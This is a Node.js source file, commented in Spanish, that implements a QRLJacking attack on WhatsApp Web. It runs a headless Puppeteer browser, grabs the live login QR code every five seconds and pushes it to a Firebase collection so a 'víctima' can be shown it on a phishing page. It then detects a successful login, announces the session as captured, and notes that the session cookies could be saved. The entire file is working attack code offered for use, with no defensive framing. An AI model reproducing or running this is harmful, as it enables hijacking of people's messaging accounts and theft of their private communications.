const puppeteer = require('puppeteer');
const admin = require('firebase-admin');
const express = require('express');
const app = express();

// 1. CONFIGURA TU FIREBASE ADMIN (Descarga el JSON desde Project Settings > Service Accounts)
const serviceAccount = require("./serviceAccountKey.json"); 

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://panel-admi-633cd.firebaseio.com"
});

const db = admin.firestore();

async function startWA(adminUID) {
    const browser = await puppeteer.launch({
        headless: "new",
        // Quitamos 'executablePath' para que use el que descarga por defecto
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage', // Añadido para evitar errores de memoria en Render
            '--single-process'         // Añadido para que consuma menos recursos
        ]
    });
    
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
    await page.goto('https://web.whatsapp.com');

    console.log(`[*] Iniciando motor para UID: ${adminUID}`);

    setInterval(async () => {
        try {
            // Buscamos el QR en la página real
            const qrCanvas = await page.$('canvas');
            if (qrCanvas) {
                const qrData = await page.evaluate(() => {
                    return document.querySelector('canvas').toDataURL();
                });

                // Lo subimos a Firebase para que la víctima lo vea en tu Cloudflare Page
                await db.collection("whatsapp_sessions").doc(adminUID).set({
                    qrCode: qrData,
                    status: "esperando",
                    lastUpdate: admin.firestore.FieldValue.serverTimestamp()
                }, { merge: true });
            }

            // Si la víctima escanea, detectamos el cambio de pantalla
            const loggedIn = await page.$('header span[data-icon="chat"]');
            if (loggedIn) {
                await db.collection("whatsapp_sessions").doc(adminUID).update({ status: "exito" });
                // Aquí podrías programar que el servidor guarde las cookies de sesión
                console.log("¡Sesión capturada con éxito!");
            }
        } catch (e) {
            // Reintenta si hay lag
        }
    }, 5000);
}

// Iniciar para tu usuario específico (puedes hacerlo dinámico con una API)
startWA("yN2SRV0ypvfzMXBKrCiUZxZgTil1");

app.get('/', (req, res) => res.send('Motor QRLJacking Activo'));
app.listen(process.env.PORT || 3000);
